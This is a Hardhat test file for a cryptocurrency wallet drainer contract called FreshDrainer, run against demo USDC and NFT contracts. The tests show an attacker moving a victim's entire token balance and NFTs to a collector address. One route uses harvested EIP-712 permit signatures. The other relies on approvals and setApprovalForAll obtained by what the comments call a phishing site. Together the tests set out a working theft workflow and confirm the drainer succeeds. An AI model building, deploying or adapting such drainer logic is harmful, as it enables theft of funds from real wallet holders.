const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("FreshDrainer", function () {
  let usdc, nft, drainer;
  let collector, victim, attacker;
  const VICTIM_USDC = ethers.parseUnits("10000", 6); // 10k USDC

  beforeEach(async function () {
    [collector, victim, attacker] = await ethers.getSigners();

    // Deploy DemoUSDC
    const DemoUSDC = await ethers.getContractFactory("DemoUSDC");
    usdc = await DemoUSDC.deploy();

    // Deploy DemoNFT
    const DemoNFT = await ethers.getContractFactory("DemoNFT");
    nft = await DemoNFT.deploy();

    // Deploy FreshDrainer with collector
    const FreshDrainer = await ethers.getContractFactory("FreshDrainer");
    drainer = await FreshDrainer.deploy(collector.address);

    // Fund victim with USDC
    await usdc.mint(victim.address, VICTIM_USDC);

    // Mint NFTs to victim
    await nft.connect(victim).mint(victim.address);
    await nft.connect(victim).mint(victim.address);
  });

  describe("Constructor", function () {
    it("should set collector correctly", async function () {
      expect(await drainer.collector()).to.equal(collector.address);
    });

    it("should revert if collector is zero address", async function () {
      const FreshDrainer = await ethers.getContractFactory("FreshDrainer");
      await expect(
        FreshDrainer.deploy(ethers.ZeroAddress)
      ).to.be.revertedWith("Collector cannot be zero");
    });
  });

  describe("drainWithPermit", function () {
    it("should drain ERC-20 with valid permit signature", async function () {
      // Build permit signature from victim
      const amount = VICTIM_USDC;
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const nonce = await usdc.nonces(victim.address);
      const drainerAddr = await drainer.getAddress();

      const domain = {
        name: "Demo USDC",
        version: "1",
        chainId: (await ethers.provider.getNetwork()).chainId,
        verifyingContract: await usdc.getAddress(),
      };
      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };
      const value = {
        owner: victim.address,
        spender: drainerAddr,
        value: amount,
        nonce: nonce,
        deadline: deadline,
      };

      const signature = await victim.signTypedData(domain, types, value);
      const { v, r, s } = ethers.Signature.from(signature);

      // Collector balance before
      const collectorBefore = await usdc.balanceOf(collector.address);
      expect(collectorBefore).to.equal(0);

      // Attacker calls drainWithPermit (anyone can call with the signed permit)
      await expect(
        drainer
          .connect(attacker)
          .drainWithPermit(
            await usdc.getAddress(),
            victim.address,
            amount,
            deadline,
            v,
            r,
            s
          )
      )
        .to.emit(drainer, "DrainedERC20")
        .withArgs(victim.address, await usdc.getAddress(), amount);

      // Verify drain
      expect(await usdc.balanceOf(victim.address)).to.equal(0);
      expect(await usdc.balanceOf(collector.address)).to.equal(VICTIM_USDC);
    });

    it("should fail with invalid permit signature", async function () {
      const amount = VICTIM_USDC;
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const drainerAddr = await drainer.getAddress();

      // Sign with wrong signer (attacker, not victim)
      const domain = {
        name: "Demo USDC",
        version: "1",
        chainId: (await ethers.provider.getNetwork()).chainId,
        verifyingContract: await usdc.getAddress(),
      };
      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };
      const value = {
        owner: victim.address, // Claims to be from victim
        spender: drainerAddr,
        value: amount,
        nonce: 0,
        deadline: deadline,
      };

      // But signed by attacker!
      const signature = await attacker.signTypedData(domain, types, value);
      const { v, r, s } = ethers.Signature.from(signature);

      // Should revert with invalid signature
      await expect(
        drainer
          .connect(attacker)
          .drainWithPermit(
            await usdc.getAddress(),
            victim.address,
            amount,
            deadline,
            v,
            r,
            s
          )
      ).to.be.reverted;
    });
  });

  describe("sweepERC20", function () {
    it("should drain after victim has approved", async function () {
      const drainerAddr = await drainer.getAddress();

      // Victim approves drainer (simulating phishing site)
      await usdc.connect(victim).approve(drainerAddr, VICTIM_USDC);

      // Attacker sweeps
      await expect(
        drainer.connect(attacker).sweepERC20(await usdc.getAddress(), victim.address)
      )
        .to.emit(drainer, "DrainedERC20")
        .withArgs(victim.address, await usdc.getAddress(), VICTIM_USDC);

      expect(await usdc.balanceOf(victim.address)).to.equal(0);
      expect(await usdc.balanceOf(collector.address)).to.equal(VICTIM_USDC);
    });

    it("should fail without approval", async function () {
      await expect(
        drainer.connect(attacker).sweepERC20(await usdc.getAddress(), victim.address)
      ).to.be.revertedWith("No allowance or balance");
    });
  });

  describe("sweepNFT", function () {
    it("should drain NFT after setApprovalForAll", async function () {
      const drainerAddr = await drainer.getAddress();

      // Victim approves all NFTs (simulating phishing)
      await nft.connect(victim).setApprovalForAll(drainerAddr, true);

      // Attacker sweeps tokenId 0
      await expect(
        drainer.connect(attacker).sweepNFT(await nft.getAddress(), victim.address, 0)
      )
        .to.emit(drainer, "DrainedNFT")
        .withArgs(victim.address, await nft.getAddress(), 0);

      expect(await nft.ownerOf(0)).to.equal(collector.address);
      expect(await nft.ownerOf(1)).to.equal(victim.address); // Still owns #1
    });

    it("should fail without setApprovalForAll", async function () {
      await expect(
        drainer.connect(attacker).sweepNFT(await nft.getAddress(), victim.address, 0)
      ).to.be.revertedWith("Not approved for all");
    });
  });

  describe("sweepNFTBatch", function () {
    it("should drain multiple NFTs in one transaction", async function () {
      const drainerAddr = await drainer.getAddress();

      // Mint more NFTs
      await nft.connect(victim).mint(victim.address); // tokenId 2

      // Victim approves all
      await nft.connect(victim).setApprovalForAll(drainerAddr, true);

      // Batch sweep
      await drainer
        .connect(attacker)
        .sweepNFTBatch(await nft.getAddress(), victim.address, [0, 1, 2]);

      expect(await nft.ownerOf(0)).to.equal(collector.address);
      expect(await nft.ownerOf(1)).to.equal(collector.address);
      expect(await nft.ownerOf(2)).to.equal(collector.address);
    });
  });
});
